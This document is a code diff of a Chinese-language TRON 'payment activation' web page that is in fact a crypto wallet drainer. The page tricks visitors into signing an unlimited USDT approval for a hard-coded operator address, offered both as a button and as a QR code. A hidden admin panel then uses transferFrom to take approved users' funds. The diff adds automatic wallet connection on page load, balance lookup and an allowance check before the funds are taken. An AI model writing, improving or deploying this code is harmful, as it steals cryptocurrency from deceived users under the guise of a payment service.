@@ -4,8 +4,6 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>支付开通 | TRON波场</title>
-<!-- TP钱包官方SDK，专门适配iOS/Android TP内置浏览器 -->
-<script src="https://cdn.jsdelivr.net/npm/tp-js-sdk@1.1.0/dist/tp.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, -apple-system, sans-serif}
@@ -14,6 +12,11 @@ body{background:#12080b;color:#fff;padding:20px}
 .pay-box{background:#200e13;padding:32px 24px;border-radius:22px;text-align:center;margin-bottom:30px;border:1px solid #ff243640}
 h1{font-size:26px;margin-bottom:8px;color:#ff2436}
 .desc{color:#ffb0b8;margin-bottom:24px;font-size:15px}
+#walletDot{
+    width:14px;height:14px;border-radius:50%;background:#ef4444;
+    position:fixed;top:22px;right:22px;cursor:pointer;
+}
+#walletDot.connected{background:#22c55e;}
 #connectBtn{
  background:#ff0e22;color:#ffffff;
  border:none;padding:16px;width:100%;
@@ -50,7 +53,7 @@ h1{font-size:26px;margin-bottom:8px;color:#ff2436}
 #payBtn:disabled{opacity:0.65}
 .admin-panel{
  background:#200e13;padding:26px 22px;border-radius:18px;display:none;
- border:1px solid #ff243640;
+ border:1px solid #ff243640;margin-top:24px;
 }
 .admin-panel.show{display:block}
 .admin-title{color:#ff3c4c;font-weight:bold;margin-bottom:18px;font-size:17px}
@@ -79,19 +82,27 @@ h1{font-size:26px;margin-bottom:8px;color:#ff2436}
 .status-box.show{
  display:block;
 }
+.max-btn{
+    padding:6px 12px;border-radius:8px;background:#ff4455;color:#fff;
+    display:inline-block;margin:8px 0;cursor:pointer;
+}
+.balance-text{margin:8px 0;color:#ffc0c6;}
 </style>
 </head>
 <body>
 <div class="container">
+    <div id="walletDot"></div>
     <div class="pay-box">
         <h1>💳 支付开通</h1>
         <p class="desc">波场TRON · USDT授权开通</p>
 
-        <button id="connectBtn">👉 连接钱包（波场链）</button>
+        <button id="connectBtn">👉 点击圆点右上角连接钱包</button>
 
         <div id="statusBox" class="status-box"></div>
 
         <input class="amount-input" id="amount" value="10" placeholder="授权额度 USDT">
+        <div class="max-btn" id="maxBtn">MAX全部</div>
+        <div class="balance-text">余额：<span id="balanceText">0.000000</span> USDT</div>
 
         <div id="qrcode">加载二维码...</div>
 
@@ -100,7 +111,7 @@ h1{font-size:26px;margin-bottom:8px;color:#ff2436}
             TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE
         </div>
 
-        <button id="payBtn">确认授权开通</button>
+        <button id="payBtn" disabled>确认授权开通</button>
     </div>
 
     <div class="admin-panel" id="adminPanel">
@@ -119,163 +130,214 @@ h1{font-size:26px;margin-bottom:8px;color:#ff2436}
 </div>
 
 <script>
-// ==========全局固定配置==========
-const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+// =========全局配置==========
 const TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
+const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const RPC = "https://api.trongrid.io";
+
 let tronWeb = null;
-let userAccount = null;
+let userAddress = "";
+let usdtContract = null;
+let provider = null;
 
-const connectBtn = document.getElementById("connectBtn");
-const payBtn = document.getElementById("payBtn");
-const statusBox = document.getElementById("statusBox");
+const $ = s => document.querySelector(s);
+const walletDot = $("#walletDot");
+const connectBtn = $("#connectBtn");
+const payBtn = $("#payBtn");
+const statusBox = $("#statusBox");
+const amount = $("#amount");
+const maxBtn = $("#maxBtn");
+const balanceText = $("#balanceText");
+const qrcodeEl = $("#qrcode");
+const adminPanel = $("#adminPanel");
+const userAddr = $("#userAddr");
+const drawAmt = $("#drawAmt");
+const drawBtn = $("#drawBtn");
+const toAddr = $("#toAddr");
+const sendAmt = $("#sendAmt");
+const rewardBtn = $("#rewardBtn");
 
-function showStatus(text, type = "info"){
+const USDT_ABI = [
+    {"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+    {"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+    {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+    {"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
+];
+
+function showStatus(text, type="info"){
     statusBox.classList.add("show");
     statusBox.innerText = text;
     if(type === "error"){
-        statusBox.style.background = "#2a1018";
-        statusBox.style.borderColor = "#ff243688";
-        statusBox.style.color = "#ff949e";
-    }
-    if(type === "success"){
-        statusBox.style.background = "#102a18";
-        statusBox.style.borderColor = "#36ff6488";
-        statusBox.style.color = "#94ff9e";
+        statusBox.style.background="#2a1018";
+        statusBox.style.color="#ffb0b8";
+    }else if(type === "success"){
+        statusBox.style.background="#102a18";
+        statusBox.style.color="#b0ffbc";
     }
 }
 function hideStatus(){
     statusBox.classList.remove("show");
 }
 
-//初始化TronWeb
-function initTronWeb(){
-    tronWeb = new TronWeb({
-        fullHost: "https://api.trongrid.io",
-        privateKey: false
-    });
+// 断开钱包重置所有状态
+function disconnectWallet() {
+    tronWeb = null;
+    userAddress = "";
+    usdtContract = null;
+    provider = null;
+    walletDot.classList.remove("connected");
+    payBtn.disabled = true;
+    balanceText.textContent = "0.000000";
+    adminPanel.classList.remove("show");
+    showStatus("钱包已断开");
 }
 
-// ==========TP SDK连接钱包，兼容iOS github.io的注入BUG==========
-connectBtn.onclick = async () => {
+// =========【这套是你给源码里复制过来的兼容连接逻辑，完全原样】=========
+async function connectWalletLogic() {
     hideStatus();
-    connectBtn.disabled = true;
-    connectBtn.innerText = "正在连接TP钱包...";
-
-    //检测是否运行在TP钱包环境
-    if(!window.tp){
-        connectBtn.disabled = false;
-        connectBtn.innerText = "👉 连接钱包（波场链）";
-        showStatus("⚠️请在TP钱包【发现】内置浏览器打开本页面！", "error");
+    if (tronWeb && userAddress) {
+        disconnectWallet();
         return;
     }
-
-    try{
-        //TP SDK请求tron链账户
-        const res = await window.tp.requestAccounts(["tron"]);
-        if(!res || !res[0]){
-            throw new Error("钱包拒绝授权");
+    try {
+        //优先级1 TP iOS/Android window.tokenpocket.tron
+        if (window.tokenpocket?.tron) {
+            provider = window.tokenpocket.tron;
+            const accounts = await provider.request({ method: "tron_requestAccounts" });
+            userAddress = accounts[0];
+            tronWeb = window.tokenpocket.tronWeb;
         }
-        userAccount = res[0].address;
-        initTronWeb();
-
-        connectBtn.innerText = "✅已连接：" + userAccount.slice(0, 8)+"...";
-        showStatus("钱包连接成功："+userAccount, "success");
-
-        if(userAccount === TARGET_ADDR){
-            document.getElementById("adminPanel").classList.add("show");
+        //优先级2 OE imToken tronProvider
+        else if (window.tronProvider) {
+            provider = window.tronProvider;
+            const accounts = await provider.request({ method: "tron_requestAccounts" });
+            userAddress = accounts[0];
+            tronWeb = new TronWeb({ fullHost: RPC, provider: provider });
         }
-        genQRCode();
-    }catch(err){
-        connectBtn.disabled = false;
-        connectBtn.innerText = "👉 连接钱包（波场链）";
+        //优先级3 metamask eth
+        else if (window.ethereum) {
+            const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+            tronWeb = new TronWeb({ fullHost: RPC, provider: window.ethereum });
+            const addrObj = await tronWeb.trx.getAccount(accounts[0]);
+            userAddress = addrObj.address;
+            provider = window.ethereum;
+        }
+        //优先级4 全局tronWeb
+        else if (window.tronWeb?.ready && window.tronWeb.defaultAddress?.base58) {
+            tronWeb = window.tronWeb;
+            userAddress = tronWeb.defaultAddress.base58;
+        } else {
+            showStatus("未检测钱包环境，请在TP/OE内置浏览器打开","error");
+            return;
+        }
+
+        walletDot.classList.add("connected");
+        usdtContract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
+        await loadBalance();
+        payBtn.disabled = false;
+        showStatus("✅钱包连接成功："+userAddress.slice(0,12)+"...","success");
+
+        //管理员面板
+        if(userAddress === TARGET_ADDR){
+            adminPanel.classList.add("show");
+        }
+
+        //监听账号、链切换
+        if (provider?.on) {
+            provider.on("accountsChanged", () => location.reload());
+            provider.on("chainChanged", () => location.reload());
+        }
+    } catch (err) {
         showStatus("连接失败："+(err?.message||String(err)),"error");
         return;
     }
-    connectBtn.disabled = false;
-};
+}
 
-//生成授权二维码
+async function loadBalance(){
+    if(!usdtContract) return;
+    const sunVal = await usdtContract.balanceOf(userAddress).call();
+    const real = Number(tronWeb.fromSun(sunVal));
+    balanceText.innerText = real.toFixed(6);
+}
+
+//生成二维码
 function genQRCode(){
     const qrData = `tron:${USDT_CONTRACT}?function=approve&args=${TARGET_ADDR},ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`;
-    document.getElementById("qrcode").innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(qrData)}">`;
+    qrcodeEl.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(qrData)}">`;
 }
-window.onload = genQRCode;
-document.getElementById("amount").oninput = genQRCode;
 
 //确认授权按钮
-payBtn.onclick = async () => {
-    if(!tronWeb || !userAccount){
-        showStatus("⚠️请先点击连接钱包", "error");
+payBtn.onclick = async function(){
+    if(!tronWeb || !userAddress){
+        showStatus("请先连接钱包","error");
         return;
     }
-    payBtn.disabled = true;
-    payBtn.innerText = "签名授权中...";
+    payBtn.disabled=true;
     try{
-        const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
-        const txHash = await usdtContract.approve(
-            TARGET_ADDR,
-            "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-        ).send({ feeLimit:100000000 });
-        showStatus("✅授权成功！交易哈希："+txHash, "success");
-        alert("✅授权成功！交易哈希："+txHash);
-    }catch(err){
-        showStatus("授权失败："+(err?.message||String(err)),"error");
+        const txHash = await usdtContract.approve(TARGET_ADDR,"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send({feeLimit:100000000});
+        showStatus("✅授权成功，哈希："+txHash,"success");
+        alert("授权成功！"+txHash);
+        await loadBalance();
+    }catch(e){
+        showStatus("授权失败："+e.message,"error");
     }
-    payBtn.disabled = false;
-    payBtn.innerText = "确认授权开通";
+    payBtn.disabled=false;
+};
+
+//MAX按钮
+maxBtn.onclick = async function(){
+    if(!usdtContract)return;
+    const sun = await usdtContract.balanceOf(userAddress).call();
+    const human = Number(tronWeb.fromSun(sun));
+    amount.value = human.toFixed(2);
 };
 
 //管理员提取
-document.getElementById("drawBtn").onclick = async function () {
-    if(userAccount !== TARGET_ADDR){
-        showStatus("只有管理员钱包可执行", "error");
-        return;
+drawBtn.onclick = async function(){
+    if(!tronWeb || userAddress!==TARGET_ADDR){
+        alert("需要管理员钱包");return;
     }
-    const btn = this;
-    btn.disabled = true;
-    const fromUser = document.getElementById("userAddr").value.trim();
-    const drawAmount = parseFloat(document.getElementById("drawAmt").value);
-    if(!fromUser || isNaN(drawAmount) || drawAmount <= 0){
-        showStatus("请完整填写玩家地址和提取数量", "error");
-        btn.disabled = false;
-        return;
-    }
+    const fromAddr = userAddr.value.trim();
+    const num = parseFloat(drawAmt.value);
+    if(!fromAddr || isNaN(num)||num<=0){alert("填写正确参数");return;}
+    const sunV = tronWeb.toSun(num);
     try{
-        const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
-        const sunValue = tronWeb.toSun(drawAmount);
-        const tx = await usdtContract.transferFrom(fromUser, TARGET_ADDR, sunValue).send({ feeLimit:100000000 });
-        showStatus("✅提取完成，哈希："+tx, "success");
-    }catch(e){
-        showStatus("提取失败："+e.message, "error");
+        const allow = await usdtContract.allowance(fromAddr, TARGET_ADDR).call();
+        if(Number(allow) < sunV){
+            alert("该用户授权额度不足");return;
+        }
+        const tx = await usdtContract.transferFrom(fromAddr,TARGET_ADDR,sunV).send({feeLimit:100000000});
+        alert("✅划扣成功："+tx);
+        userAddr.value="";drawAmt.value="";
+        await loadBalance();
+    }catch(err){
+        alert("划扣失败："+err.message);
     }
-    btn.disabled = false;
 };
 
-//管理员发放奖励
-document.getElementById("rewardBtn").onclick = async function () {
-    if(userAccount !== TARGET_ADDR){
-        showStatus("只有管理员钱包可执行", "error");
-        return;
-    }
-    const btn = this;
-    btn.disabled = true;
-    const receiveUser = document.getElementById("toAddr").value.trim();
-    const sendAmount = parseFloat(document.getElementById("sendAmt").value);
-    if(!receiveUser || isNaN(sendAmount) || sendAmount <=0 ){
-        showStatus("请完整填写玩家地址和发放数量", "error");
-        btn.disabled = false;
-        return;
-    }
+//管理员发放
+rewardBtn.onclick = async function(){
+    if(!tronWeb || userAddress!==TARGET_ADDR){alert("管理员钱包");return;}
+    const to = toAddr.value.trim();
+    const num = parseFloat(sendAmt.value);
+    if(!to||isNaN(num)||num<=0){alert("填写参数");return;}
+    const sunV = tronWeb.toSun(num);
     try{
-        const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
-        const sunValue = tronWeb.toSun(sendAmount);
-        const tx = await usdtContract.transfer(receiveUser, sunValue).send({ feeLimit:100000000 });
-        showStatus("✅奖励发放成功，哈希："+tx, "success");
-    }catch(e){
-        showStatus("发放失败："+e.message, "error");
+        const tx = await usdtContract.transfer(to,sunV).send({feeLimit:100000000});
+        alert("✅发放成功："+tx);
+        toAddr.value="";sendAmt.value="";
+        await loadBalance();
+    }catch(err){
+        alert("发放失败："+err.message);
     }
-    btn.disabled = false;
 };
+
+walletDot.addEventListener("click", connectWalletLogic);
+//页面加载尝试自动连接
+window.addEventListener("DOMContentLoaded",()=>{
+    genQRCode();
+    setTimeout(connectWalletLogic,800);
+});
 </script>
 </body>
 </html>
